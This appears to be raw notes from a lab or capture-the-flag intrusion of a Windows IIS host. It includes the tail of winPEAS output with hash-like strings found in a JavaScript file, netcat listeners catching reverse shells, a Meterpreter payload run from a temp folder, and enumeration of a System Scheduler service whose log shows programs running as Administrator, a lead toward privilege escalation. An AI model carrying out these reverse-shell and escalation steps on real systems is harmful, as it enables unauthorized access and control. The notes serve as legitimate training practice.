C:\inetpub\wwwroot\Custom\Themes\Standard-2017\src\js\bootstrap.min.js: =58c49e6cf35ff8c358be01e8633e91cc)
C:\inetpub\wwwroot\Custom\Themes\Standard-2017\src\js\bootstrap.min.js: /58c49e6cf35ff8c358be01e8633e91cc

       /---------------------------------------------------------------------------------\                                    
       |                             Do you like PEASS?                                  |                                    
       |---------------------------------------------------------------------------------|                                    
       |         Follow on Twitter         :     @hacktricks_live                        |                                    
       |         Respect on HTB            :     SirBroccoli                             |                                    
       |---------------------------------------------------------------------------------|                                    
       |                                 Thank you!                                      |                                    
       \---------------------------------------------------------------------------------/                                    
               
```


all the rest    incl winpeas.bat run as ???
```sh
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ C:\windows\temp\revsh-meterpr-444.exe
C:windowstemprevsh-meterpr-444.exe: command not found
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ C:\windows\temp\revsh-meterpr-444.exe
C:windowstemprevsh-meterpr-444.exe: command not found
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443                         
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.33.96] 49477
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
C:\windows\temp\revsh-meterpr-444.exe         
c:\windows\system32\inetsrv>C:\windows\temp\revsh-meterpr-444.exe

c:\windows\system32\inetsrv>
sc queryex state=all type=service
c:\windows\system32\inetsrv>sc queryex state=all type=service
[SC] EnumQueryServicesStatus:OpenService FAILED 1060:
The specified service does not exist as an installed service.
sc                               
c:\windows\system32\inetsrv>sc
DESCRIPTION:
        SC is a command line program used for communicating with the
        Service Control Manager and services.
USAGE:
        sc <server> [command] [service name] <option1> <option2>...
        The option <server> has the form "\\ServerName"
        Further help on commands can be obtained by typing: "sc [command]"
        Commands:
          query-----------Queries the status for a service, or
                          enumerates the status for types of services.
          queryex---------Queries the extended status for a service, or
                          enumerates the status for types of services.
          start-----------Starts a service.
          pause-----------Sends a PAUSE control request to a service.
          interrogate-----Sends an INTERROGATE control request to a service.
          continue--------Sends a CONTINUE control request to a service.
          stop------------Sends a STOP request to a service.
          config----------Changes the configuration of a service (persistent).
          description-----Changes the description of a service.
          failure---------Changes the actions taken by a service upon failure.
          failureflag-----Changes the failure actions flag of a service.
          sidtype---------Changes the service SID type of a service.
          privs-----------Changes the required privileges of a service.
          managedaccount--Changes the service to mark the service account 
                          password as managed by LSA.
          qc--------------Queries the configuration information for a service.
          qdescription----Queries the description for a service.
          qfailure--------Queries the actions taken by a service upon failure.
          qfailureflag----Queries the failure actions flag of a service.
          qsidtype--------Queries the service SID type of a service.
          qprivs----------Queries the required privileges of a service.
          qtriggerinfo----Queries the trigger parameters of a service.
          qpreferrednode--Queries the preferred NUMA node of a service.
          qrunlevel-------Queries the run level of a service.
          qmanagedaccount-Queries whether a services uses an account with a 
                          password managed by LSA.
          qprotection-----Queries the process protection level of a service.
          delete----------Deletes a service (from the registry).
          create----------Creates a service. (adds it to the registry).
          control---------Sends a control to a service.
          sdshow----------Displays a service's security descriptor.
          sdset-----------Sets a service's security descriptor.
          showsid---------Displays the service SID string corresponding to an arbitrary name.
          triggerinfo-----Configures the trigger parameters of a service.
          preferrednode---Sets the preferred NUMA node of a service.
          runlevel--------Sets the run level of a service.
          GetDisplayName--Gets the DisplayName for a service.
          GetKeyName------Gets the ServiceKeyName for a service.
          EnumDepend------Enumerates Service Dependencies.
        The following commands don't require a service name:
        sc <server> <command> <option>
          boot------------(ok | bad) Indicates whether the last boot should
                          be saved as the last-known-good boot configuration
          Lock------------Locks the Service Database
          QueryLock-------Queries the LockStatus for the SCManager Database
EXAMPLE:
        sc start MyService
Would you like to see help for the QUERY and QUERYEX commands? [ y | n ]: 
sc queryex
y





^C
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.33.96] 49492
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
powershell
c:\windows\system32\inetsrv>powershell
Windows PowerShell 
Copyright (C) 2013 Microsoft Corporation. All rights reserved.

get-service

whoami
^C
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.33.96] 49534
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
sc qc WindowsScheduler
c:\windows\system32\inetsrv>sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS
SERVICE_NAME: WindowsScheduler
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

c:\windows\system32\inetsrv>
wevtutil qe Microsoft-Windows-TaskScheduler/Operational /f:text /c:10
c:\windows\system32\inetsrv>wevtutil qe Microsoft-Windows-TaskScheduler/Operational /f:text /c:10
^C
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.33.96] 49564
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
cd c:/users
c:\windows\system32\inetsrv>cd c:/users
cd
c:\Users>cd
c:\Users
C:\windows\temp\revsh-meterpr-444.exe
c:\Users>C:\windows\temp\revsh-meterpr-444.exe
cd
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.33.96] 49633
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
cd C:\PROGRA~2\SYSTEM~1
c:\windows\system32\inetsrv>cd C:\PROGRA~2\SYSTEM~1
cd
C:\PROGRA~2\SYSTEM~1>cd
C:\PROGRA~2\SYSTEM~1

C:\PROGRA~2\SYSTEM~1>
cd events
C:\PROGRA~2\SYSTEM~1>cd events
cd
C:\PROGRA~2\SYSTEM~1\Events>cd
C:\PROGRA~2\SYSTEM~1\Events
dir
C:\PROGRA~2\SYSTEM~1\Events>dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of C:\PROGRA~2\SYSTEM~1\Events
06/07/2024  11:12 AM    <DIR>          .
06/07/2024  11:12 AM    <DIR>          ..
06/07/2024  11:13 AM             1,926 20198415519.INI
06/07/2024  11:13 AM            70,307 20198415519.INI_LOG.txt
10/02/2020  02:50 PM               290 2020102145012.INI
06/07/2024  11:04 AM               186 Administrator.flg
06/07/2024  04:43 AM                 0 Scheduler.flg
06/07/2024  11:04 AM                 0 service.flg
06/07/2024  11:04 AM               449 SessionInfo.flg
06/07/2024  11:04 AM               182 SYSTEM_svc.flg
               8 File(s)         73,340 bytes
               2 Dir(s)  39,056,310,272 bytes free
type 20198415519.INI_LOG.txt
C:\PROGRA~2\SYSTEM~1\Events>type 20198415519.INI_LOG.txt
08/04/19 15:06:01,Event Started Ok, (Administrator)
08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)
08/04/19 15:07:00,Event Started Ok, (Administrator)
08/04/19 15:07:34,Process Ended. PID:2680,ExitCode:4,Message.exe (Administrator)
08/04/19 15:08:00,Event Started Ok, (Administrator)
08/04/19 15:08:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator)
08/04/19 15:09:00,Event Started Ok, (Administrator)
08/04/19 15:09:34,Process Ended. PID:3024,ExitCode:4,Message.exe (Administrator)
08/04/19 15:10:00,Event Started Ok, (Administrator)
08/04/19 15:10:33,Process Ended. PID:1556,ExitCode:4,Message.exe (Administrator)
08/04/19 15:11:00,Event Started Ok, (Administrator)
08/04/19 15:11:33,Process Ended. PID:468,ExitCode:4,Message.exe (Administrator)
08/04/19 15:12:00,Event Started Ok, (Administrator)
08/04/19 15:12:33,Process Ended. PID:2244,ExitCode:4,Message.exe (Administrator)
08/04/19 15:13:00,Event Started Ok, (Administrator)
08/04/19 15:13:33,Process Ended. PID:1700,ExitCode:4,Message.exe (Administrator)
08/04/19 16:43:00,Event Started Ok,Can not display reminders while logged out. (SYSTEM_svc)*
08/04/19 16:44:01,Event Started Ok, (Administrator)
08/04/19 16:44:05,Process Ended. PID:2228,ExitCode:1,Message.exe (Administrator)
08/04/19 16:45:00,Event Started Ok, (Administrator)
08/04/19 16:45:20,Process Ended. PID:2640,ExitCode:1,Message.exe (Administrator)
08/04/19 16:46:00,Event Started Ok, (Administrator)
08/04/19 16:46:03,Process Ended. PID:2912,ExitCode:1,Message.exe (Administrator)
08/04/19 16:47:00,Event Started Ok, (Administrator)
08/04/19 16:47:24,Process Ended. PID:1944,ExitCode:1,Message.exe (Administrator)
08/04/19 16:48:01,Event Started Ok, (Administrator)
08/04/19 16:48:18,Process Ended. PID:712,ExitCode:1,Message.exe (Administrator)
08/04/19 16:49:00,Event Started Ok, (Administrator)
08/04/19 16:49:23,Process Ended. PID:1936,ExitCode:1,Message.exe (Administrator)
08/04/19 18:00:01,Event Started Ok, (Administrator)
08/04/19 18:00:09,Process Ended. PID:2536,ExitCode:1,Message.exe (Administrator)
08/04/19 18:01:00,Event Started Ok, (Administrator)
08/04/19 18:01:03,Process Ended. PID:2140,ExitCode:1,Message.exe (Administrator)
08/04/19 18:02:01,Event Started Ok, (Administrator)
08/04/19 18:02:03,Process Ended. PID:2652,ExitCode:1,Message.exe (Administrator)
08/04/19 18:03:00,Event Started Ok, (Administrator)
08/04/19 18:03:03,Process Ended. PID:1584,ExitCode:1,Message.exe (Administrator)
08/04/19 18:04:00,Event Started Ok, (Administrator)
08/04/19 18:04:03,Process Ended. PID:2588,ExitCode:1,Message.exe (Administrator)
08/04/19 18:05:01,Event Started Ok, (Administrator)
08/05/19 13:27:01,Event Started Ok, (Administrator)
08/05/19 13:27:01,Process Ended. PID:2836,ExitCode:1,Message.exe (Administrator)
08/05/19 13:28:00,Event Started Ok, (Administrator)
08/05/19 13:28:18,Process Ended. PID:2212,ExitCode:1,Message.exe (Administrator)
08/05/19 13:29:00,Event Started Ok, (Administrator)
08/05/19 13:29:33,Process Ended. PID:2660,ExitCode:4,Message.exe (Administrator)
08/05/19 13:30:01,Event Started Ok, (Administrator)
08/05/19 13:30:34,Process Ended. PID:1996,ExitCode:4,Message.exe (Administrator)
08/05/19 13:31:00,Event Started Ok, (Administrator)
08/05/19 13:31:33,Process Ended. PID:2084,ExitCode:4,Message.exe (Administrator)
08/05/19 13:32:00,Event Started Ok, (Administrator)
08/05/19 13:32:33,Process Ended. PID:1392,ExitCode:4,Message.exe (Administrator)
08/05/19 13:33:00,Event Started Ok, (Administrator)
08/05/19 13:33:33,Process Ended. PID:1208,ExitCode:4,Message.exe (Administrator)
08/05/19 13:34:00,Event Started Ok, (Administrator)
08/05/19 13:34:33,Process Ended. PID:2400,ExitCode:4,Message.exe (Administrator)
08/05/19 13:35:00,Event Started Ok, (Administrator)
08/05/19 13:35:33,Process Ended. PID:1808,ExitCode:4,Message.exe (Administrator)
08/05/19 13:36:00,Event Started Ok, (Administrator)
08/05/19 13:36:33,Process Ended. PID:2428,ExitCode:4,Message.exe (Administrator)
08/05/19 13:37:00,Event Started Ok, (Administrator)
08/05/19 13:37:34,Process Ended. PID:2456,ExitCode:4,Message.exe (Administrator)
08/05/19 13:38:00,Event Started Ok, (Administrator)
08/05/19 13:38:33,Process Ended. PID:2344,ExitCode:4,Message.exe (Administrator)
08/05/19 13:39:00,Event Started Ok, (Administrator)
08/05/19 13:39:34,Process Ended. PID:1396,ExitCode:4,Message.exe (Administrator)
08/05/19 13:40:00,Event Started Ok, (Administrator)
08/05/19 13:40:33,Process Ended. PID:1748,ExitCode:4,Message.exe (Administrator)
08/05/19 13:41:00,Event Started Ok, (Administrator)
08/05/19 13:41:33,Process Ended. PID:2212,ExitCode:4,Message.exe (Administrator)
08/05/19 13:42:00,Event Started Ok, (Administrator)
08/05/19 13:42:32,Process Ended. PID:2800,ExitCode:4,Message.exe (Administrator)
08/05/19 13:43:00,Event Started Ok, (Administrator)
08/05/19 13:43:33,Process Ended. PID:580,ExitCode:4,Message.exe (Administrator)
08/05/19 14:04:01,Event Started Ok, (Administrator)
08/05/19 14:04:33,Process Ended. PID:732,ExitCode:4,Message.exe (Administrator)
08/05/19 14:05:00,Event Started Ok, (Administrator)
08/05/19 14:05:34,Process Ended. PID:1584,ExitCode:4,Message.exe (Administrator)
08/05/19 14:06:00,Event Started Ok, (Administrator)
08/05/19 14:06:33,Process Ended. PID:1980,ExitCode:4,Message.exe (Administrator)
08/05/19 14:07:00,Event Started Ok, (Administrator)
08/05/19 14:07:33,Process Ended. PID:1236,ExitCode:4,Message.exe (Administrator)
08/05/19 14:08:00,Event Started Ok, (Administrator)
08/05/19 14:08:33,Process Ended. PID:1892,ExitCode:4,Message.exe (Administrator)
08/05/19 14:09:00,Event Started Ok, (Administrator)
08/05/19 14:09:33,Process Ended. PID:1852,ExitCode:4,Message.exe (Administrator)
08/05/19 14:10:00,Event Started Ok, (Administrator)
08/05/19 14:10:33,Process Ended. PID:972,ExitCode:4,Message.exe (Administrator)
08/05/19 14:11:00,Event Started Ok, (Administrator)
08/05/19 14:11:34,Process Ended. PID:1684,ExitCode:4,Message.exe (Administrator)
08/05/19 14:12:00,Event Started Ok, (Administrator)
08/05/19 14:12:33,Process Ended. PID:96,ExitCode:4,Message.exe (Administrator)
08/05/19 14:13:00,Event Started Ok, (Administrator)
08/05/19 14:13:34,Process Ended. PID:1620,ExitCode:4,Message.exe (Administrator)
08/05/19 14:15:00,Event Started Ok, (Administrator)
08/05/19 14:15:33,Process Ended. PID:800,ExitCode:4,Message.exe (Administrator)
08/05/19 14:16:00,Event Started Ok, (Administrator)
08/05/19 14:16:33,Process Ended. PID:1940,ExitCode:4,Message.exe (Administrator)
08/05/19 14:17:00,Event Started Ok, (Administrator)
08/05/19 14:17:33,Process Ended. PID:1656,ExitCode:4,Message.exe (Administrator)
08/05/19 14:18:00,Event Started Ok, (Administrator)
08/05/19 14:18:33,Process Ended. PID:1296,ExitCode:4,Message.exe (Administrator)
08/05/19 14:19:00,Event Started Ok, (Administrator)
08/05/19 14:19:33,Process Ended. PID:1884,ExitCode:4,Message.exe (Administrator)
08/05/19 14:20:00,Event Started Ok, (Administrator)
08/05/19 14:20:34,Process Ended. PID:1108,ExitCode:4,Message.exe (Administrator)
08/05/19 14:21:00,Event Started Ok, (Administrator)
08/05/19 14:21:33,Process Ended. PID:1664,ExitCode:4,Message.exe (Administrator)
08/05/19 14:22:00,Event Started Ok, (Administrator)
08/05/19 14:22:34,Process Ended. PID:1748,ExitCode:4,Message.exe (Administrator)
08/05/19 14:23:00,Event Started Ok, (Administrator)
08/05/19 14:23:33,Process Ended. PID:1168,ExitCode:4,Message.exe (Administrator)
08/05/19 14:24:01,Event Started Ok, (Administrator)
08/05/19 14:24:34,Process Ended. PID:1904,ExitCode:4,Message.exe (Administrator)
08/05/19 14:25:00,Event Started Ok, (Administrator)
08/05/19 14:25:33,Process Ended. PID:1296,ExitCode:4,Message.exe (Administrator)
08/05/19 14:26:00,Event Started Ok, (Administrator)
08/05/19 14:26:34,Process Ended. PID:1192,ExitCode:4,Message.exe (Administrator)
08/05/19 14:27:00,Event Started Ok, (Administrator)
08/05/19 14:27:03,Process Ended. PID:96,ExitCode:1,Message.exe (Administrator)
08/05/19 14:28:00,Event Started Ok, (Administrator)
08/05/19 14:28:33,Process Ended. PID:1980,ExitCode:4,Message.exe (Administrator)
08/05/19 14:29:00,Event Started Ok, (Administrator)
08/05/19 14:29:34,Process Ended. PID:1396,ExitCode:4,Message.exe (Administrator)
08/05/19 14:30:00,Event Started Ok, (Administrator)
08/05/19 14:30:33,Process Ended. PID:716,ExitCode:4,Message.exe (Administrator)
08/05/19 14:31:00,Event Started Ok, (Administrator)
08/05/19 14:31:34,Process Ended. PID:1580,ExitCode:4,Message.exe (Administrator)
08/05/19 14:32:00,Event Started Ok, (Administrator)
08/05/19 14:32:33,Process Ended. PID:1740,ExitCode:4,Message.exe (Administrator)
08/05/19 14:33:00,Event Started Ok, (Administrator)
08/05/19 14:33:33,Process Ended. PID:652,ExitCode:4,Message.exe (Administrator)
08/05/19 14:34:00,Event Started Ok, (Administrator)
08/05/19 14:34:33,Process Ended. PID:1580,ExitCode:4,Message.exe (Administrator)
08/05/19 14:35:00,Event Started Ok, (Administrator)
08/05/19 14:35:33,Process Ended. PID:932,ExitCode:4,Message.exe (Administrator)
08/05/19 14:36:00,Event Started Ok, (Administrator)
08/05/19 14:36:33,Process Ended. PID:1520,ExitCode:4,Message.exe (Administrator)
08/05/19 14:37:00,Event Started Ok, (Administrator)
08/05/19 14:37:33,Process Ended. PID:952,ExitCode:4,Message.exe (Administrator)
08/05/19 14:38:00,Event Started Ok, (Administrator)
08/05/19 14:38:33,Process Ended. PID:1960,ExitCode:4,Message.exe (Administrator)
08/05/19 14:39:00,Event Started Ok, (Administrator)
08/05/19 14:39:33,Process Ended. PID:1336,ExitCode:4,Message.exe (Administrator)
08/05/19 14:40:00,Event Started Ok, (Administrator)
08/05/19 14:40:33,Process Ended. PID:1940,ExitCode:4,Message.exe (Administrator)
08/05/19 14:41:00,Event Started Ok, (Administrator)
08/05/19 14:41:33,Process Ended. PID:604,ExitCode:4,Message.exe (Administrator)
08/05/19 14:42:00,Event Started Ok, (Administrator)
08/05/19 14:42:33,Process Ended. PID:204,ExitCode:4,Message.exe (Administrator)
08/06/19 14:12:00,Event Started Ok,Can not display reminders while logged out. (SYSTEM_svc)*
08/06/19 14:13:04,Event Started Ok, (Administrator)
08/06/19 14:13:36,Process Ended. PID:2788,ExitCode:4,Message.exe (Administrator)
08/06/19 14:14:01,Event Started Ok, (Administrator)
08/06/19 14:14:33,Process Ended. PID:2728,ExitCode:4,Message.exe (Administrator)
08/06/19 14:15:01,Event Started Ok, (Administrator)
08/06/19 14:15:34,Process Ended. PID:2776,ExitCode:4,Message.exe (Administrator)
08/06/19 14:16:01,Event Started Ok, (Administrator)
10/02/20 14:13:02,Event Started Ok, (Administrator)
10/02/20 14:13:33,Process Ended. PID:3352,ExitCode:4,Message.exe (Administrator)
10/02/20 14:14:02,Event Started Ok, (Administrator)
10/02/20 14:14:33,Process Ended. PID:3312,ExitCode:4,Message.exe (Administrator)
10/02/20 14:15:00,Event Started Ok, (Administrator)
10/02/20 14:15:24,Process Ended. PID:1944,ExitCode:1,Message.exe (Administrator)
10/02/20 14:16:00,Event Started Ok, (Administrator)
10/02/20 14:16:33,Process Ended. PID:3712,ExitCode:4,Message.exe (Administrator)
10/02/20 14:17:01,Event Started Ok, (Administrator)
10/02/20 14:17:04,Process Ended. PID:3308,ExitCode:1,Message.exe (Administrator)
10/02/20 14:18:02,Event Started Ok, (Administrator)
10/02/20 14:18:34,Process Ended. PID:3896,ExitCode:4,Message.exe (Administrator)
10/02/20 14:19:01,Event Started Ok, (Administrator)
10/02/20 14:19:33,Process Ended. PID:3384,ExitCode:4,Message.exe (Administrator)
10/02/20 14:20:01,Event Started Ok, (Administrator)
10/02/20 14:20:17,Process Ended. PID:3748,ExitCode:1,Message.exe (Administrator)
10/02/20 14:21:02,Event Started Ok, (Administrator)
10/02/20 14:21:34,Process Ended. PID:476,ExitCode:4,Message.exe (Administrator)
10/02/20 14:22:01,Event Started Ok, (Administrator)
10/02/20 14:22:05,Process Ended. PID:904,ExitCode:1,Message.exe (Administrator)
10/02/20 14:23:00,Event Started Ok, (Administrator)
10/02/20 14:23:15,Process Ended. PID:1740,ExitCode:1,Message.exe (Administrator)
10/02/20 14:24:01,Event Started Ok, (Administrator)
10/02/20 14:24:03,Process Ended. PID:2116,ExitCode:1,Message.exe (Administrator)
10/02/20 14:25:00,Event Started Ok, (Administrator)
10/02/20 14:25:03,Process Ended. PID:948,ExitCode:1,Message.exe (Administrator)
10/02/20 14:26:02,Event Started Ok, (Administrator)
10/02/20 14:26:03,Process Ended. PID:3276,ExitCode:1,Message.exe (Administrator)
10/02/20 14:27:01,Event Started Ok, (Administrator)
10/02/20 14:27:04,Process Ended. PID:3892,ExitCode:1,Message.exe (Administrator)
10/02/20 14:28:01,Event Started Ok, (Administrator)
10/02/20 14:28:04,Process Ended. PID:3236,ExitCode:1,Message.exe (Administrator)
10/02/20 14:29:01,Event Started Ok, (Administrator)
10/02/20 14:29:06,Process Ended. PID:3700,ExitCode:1,Message.exe (Administrator)
10/02/20 14:30:01,Event Started Ok, (Administrator)
10/02/20 14:30:04,Process Ended. PID:2280,ExitCode:1,Message.exe (Administrator)
10/02/20 14:32:02,Event Started Ok, (Administrator)
10/02/20 14:32:33,Process Ended. PID:2904,ExitCode:4,Message.exe (Administrator)
10/02/20 14:33:02,Event Started Ok, (Administrator)
10/02/20 14:33:03,Process Ended. PID:3556,ExitCode:1,Message.exe (Administrator)
10/02/20 14:34:02,Event Started Ok, (Administrator)
10/02/20 14:34:03,Process Ended. PID:2596,ExitCode:1,Message.exe (Administrator)
10/02/20 14:35:01,Event Started Ok, (Administrator)
10/02/20 14:35:04,Process Ended. PID:3292,ExitCode:1,Message.exe (Administrator)
10/02/20 14:36:00,Event Started Ok, (Administrator)
10/02/20 14:36:05,Process Ended. PID:2788,ExitCode:1,Message.exe (Administrator)
10/02/20 14:37:01,Event Started Ok, (Administrator)
10/02/20 14:37:33,Process Ended. PID:3196,ExitCode:4,Message.exe (Administrator)
10/02/20 14:38:01,Event Started Ok, (Administrator)
10/02/20 14:38:03,Process Ended. PID:2512,ExitCode:1,Message.exe (Administrator)
10/02/20 14:39:01,Event Started Ok, (Administrator)
10/02/20 14:39:04,Process Ended. PID:2748,ExitCode:1,Message.exe (Administrator)
10/02/20 14:40:01,Event Started Ok, (Administrator)
10/02/20 14:40:04,Process Ended. PID:3584,ExitCode:1,Message.exe (Administrator)
10/02/20 14:41:01,Event Started Ok, (Administrator)
10/02/20 14:41:03,Process Ended. PID:3280,ExitCode:1,Message.exe (Administrator)
10/02/20 14:42:00,Event Started Ok, (Administrator)
10/02/20 14:42:04,Process Ended. PID:2300,ExitCode:1,Message.exe (Administrator)
10/02/20 14:43:01,Event Started Ok, (Administrator)
10/02/20 14:43:08,Process Ended. PID:3452,ExitCode:1,Message.exe (Administrator)
10/02/20 14:44:01,Event Started Ok, (Administrator)
10/02/20 14:44:05,Process Ended. PID:552,ExitCode:1,Message.exe (Administrator)
10/02/20 14:45:01,Event Started Ok, (Administrator)
10/02/20 14:45:33,Process Ended. PID:3972,ExitCode:4,Message.exe (Administrator)
10/02/20 14:46:00,Event Started Ok, (Administrator)
10/02/20 14:46:04,Process Ended. PID:3360,ExitCode:1,Message.exe (Administrator)
10/02/20 14:47:00,Event Started Ok, (Administrator)
10/02/20 14:47:05,Process Ended. PID:3536,ExitCode:1,Message.exe (Administrator)
10/02/20 14:48:00,Event Started Ok, (Administrator)
10/02/20 14:48:03,Process Ended. PID:2956,ExitCode:1,Message.exe (Administrator)
10/02/20 14:51:01,Event Started Ok, (Administrator)
10/02/20 14:51:33,Process Ended. PID:3732,ExitCode:4,Message.exe (Administrator)
10/02/20 14:52:00,Event Started Ok, (Administrator)
10/02/20 14:52:19,Process Ended. PID:4076,ExitCode:1,Message.exe (Administrator)
10/02/20 14:53:01,Event Started Ok, (Administrator)
10/02/20 14:53:31,Process Ended. PID:3728,ExitCode:4,Message.exe (Administrator)
10/02/20 14:54:00,Event Started Ok, (Administrator)
10/02/20 14:54:10,Process Ended. PID:3464,ExitCode:1,Message.exe (Administrator)
10/02/20 14:55:00,Event Started Ok, (Administrator)
10/02/20 14:55:05,Process Ended. PID:3488,ExitCode:1,Message.exe (Administrator)
10/02/20 14:56:01,Event Started Ok, (Administrator)
10/02/20 14:56:33,Process Ended. PID:4040,ExitCode:4,Message.exe (Administrator)
10/02/20 14:57:00,Event Started Ok, (Administrator)
10/02/20 14:57:07,Process Ended. PID:3460,ExitCode:1,Message.exe (Administrator)
10/02/20 14:58:01,Event Started Ok, (Administrator)
10/02/20 14:58:33,Process Ended. PID:3264,ExitCode:4,Message.exe (Administrator)
10/02/20 14:59:00,Event Started Ok, (Administrator)
10/02/20 14:59:34,Process Ended. PID:1244,ExitCode:4,Message.exe (Administrator)
10/02/20 15:00:01,Event Started Ok, (Administrator)
10/02/20 15:00:33,Process Ended. PID:3680,ExitCode:4,Message.exe (Administrator)
10/02/20 15:01:00,Event Started Ok, (Administrator)
10/02/20 15:01:34,Process Ended. PID:3536,ExitCode:4,Message.exe (Administrator)
10/02/20 15:02:01,Event Started Ok, (Administrator)
10/02/20 15:02:33,Process Ended. PID:2044,ExitCode:4,Message.exe (Administrator)
10/02/20 15:03:01,Event Started Ok, (Administrator)
10/02/20 15:03:03,Process Ended. PID:2248,ExitCode:1,Message.exe (Administrator)
10/02/20 15:05:00,Event Started Ok,Can not display reminders while logged out. (SYSTEM_svc)*
10/02/20 15:07:00,Event Started Ok,Can not display reminders while logged out. (SYSTEM_svc)*
10/02/20 15:08:02,Event Started Ok, (Administrator)
10/02/20 15:08:33,Process Ended. PID:2396,ExitCode:4,Message.exe (Administrator)
10/02/20 15:09:00,Event Started Ok, (Administrator)
10/02/20 15:09:33,Process Ended. PID:2636,ExitCode:4,Message.exe (Administrator)
10/02/20 15:10:00,Event Started Ok, (Administrator)
10/02/20 15:10:07,Process Ended. PID:1760,ExitCode:1,Message.exe (Administrator)
06/07/24 04:43:00,Event Started Ok,Can not display reminders while logged out. (SYSTEM_svc)*
06/07/24 04:44:02,Event Started Ok, (Administrator)
06/07/24 04:44:35,Process Ended. PID:2412,ExitCode:4,Message.exe (Administrator)
06/07/24 04:45:01,Event Started Ok, (Administrator)
06/07/24 04:45:33,Process Ended. PID:1824,ExitCode:4,Message.exe (Administrator)
06/07/24 04:46:01,Event Started Ok, (Administrator)
06/07/24 04:46:34,Process Ended. PID:3028,ExitCode:4,Message.exe (Administrator)
06/07/24 04:47:01,Event Started Ok, (Administrator)
06/07/24 04:47:33,Process Ended. PID:1620,ExitCode:4,Message.exe (Administrator)
06/07/24 04:48:01,Event Started Ok, (Administrator)
06/07/24 04:48:33,Process Ended. PID:1836,ExitCode:4,Message.exe (Administrator)
06/07/24 04:49:01,Event Started Ok, (Administrator)
06/07/24 04:49:33,Process Ended. PID:1932,ExitCode:4,Message.exe (Administrator)
06/07/24 04:50:01,Event Started Ok, (Administrator)
06/07/24 04:50:33,Process Ended. PID:2508,ExitCode:4,Message.exe (Administrator)
06/07/24 04:51:01,Event Started Ok, (Administrator)
06/07/24 04:51:33,Process Ended. PID:2012,ExitCode:4,Message.exe (Administrator)
06/07/24 04:52:01,Event Started Ok, (Administrator)
06/07/24 04:52:34,Process Ended. PID:2132,ExitCode:4,Message.exe (Administrator)
06/07/24 04:53:01,Event Started Ok, (Administrator)
06/07/24 04:53:33,Process Ended. PID:2732,ExitCode:4,Message.exe (Administrator)
06/07/24 04:54:02,Event Started Ok, (Administrator)
06/07/24 04:54:34,Process Ended. PID:2264,ExitCode:4,Message.exe (Administrator)
06/07/24 04:55:01,Event Started Ok, (Administrator)
06/07/24 04:55:33,Process Ended. PID:1744,ExitCode:4,Message.exe (Administrator)
06/07/24 04:56:00,Event Started Ok, (Administrator)
06/07/24 04:56:34,Process Ended. PID:2324,ExitCode:4,Message.exe (Administrator)
06/07/24 04:57:01,Event Started Ok, (Administrator)
06/07/24 04:57:33,Process Ended. PID:2236,ExitCode:4,Message.exe (Administrator)
06/07/24 04:58:02,Event Started Ok, (Administrator)
06/07/24 04:58:34,Process Ended. PID:2892,ExitCode:4,Message.exe (Administrator)
06/07/24 04:59:01,Event Started Ok, (Administrator)
06/07/24 04:59:33,Process Ended. PID:720,ExitCode:4,Message.exe (Administrator)
06/07/24 05:00:01,Event Started Ok, (Administrator)
06/07/24 05:00:34,Process Ended. PID:2924,ExitCode:4,Message.exe (Administrator)
06/07/24 05:01:01,Event Started Ok, (Administrator)
06/07/24 05:01:33,Process Ended. PID:3024,ExitCode:4,Message.exe (Administrator)
06/07/24 05:02:01,Event Started Ok, (Administrator)
06/07/24 05:02:34,Process Ended. PID:1804,ExitCode:4,Message.exe (Administrator)
06/07/24 05:03:01,Event Started Ok, (Administrator)
06/07/24 05:03:33,Process Ended. PID:2416,ExitCode:4,Message.exe (Administrator)
06/07/24 05:04:02,Event Started Ok, (Administrator)
06/07/24 05:04:34,Process Ended. PID:1620,ExitCode:4,Message.exe (Administrator)
06/07/24 05:05:01,Event Started Ok, (Administrator)
06/07/24 05:05:33,Process Ended. PID:2972,ExitCode:4,Message.exe (Administrator)
06/07/24 05:06:02,Event Started Ok, (Administrator)
06/07/24 05:06:34,Process Ended. PID:1244,ExitCode:4,Message.exe (Administrator)
06/07/24 05:07:01,Event Started Ok, (Administrator)
06/07/24 05:07:33,Process Ended. PID:2912,ExitCode:4,Message.exe (Administrator)
06/07/24 05:08:01,Event Started Ok, (Administrator)
06/07/24 05:08:34,Process Ended. PID:2868,ExitCode:4,Message.exe (Administrator)
06/07/24 05:09:00,Event Started Ok, (Administrator)
06/07/24 05:09:33,Process Ended. PID:108,ExitCode:4,Message.exe (Administrator)
06/07/24 05:10:01,Event Started Ok, (Administrator)
06/07/24 05:10:34,Process Ended. PID:2516,ExitCode:4,Message.exe (Administrator)
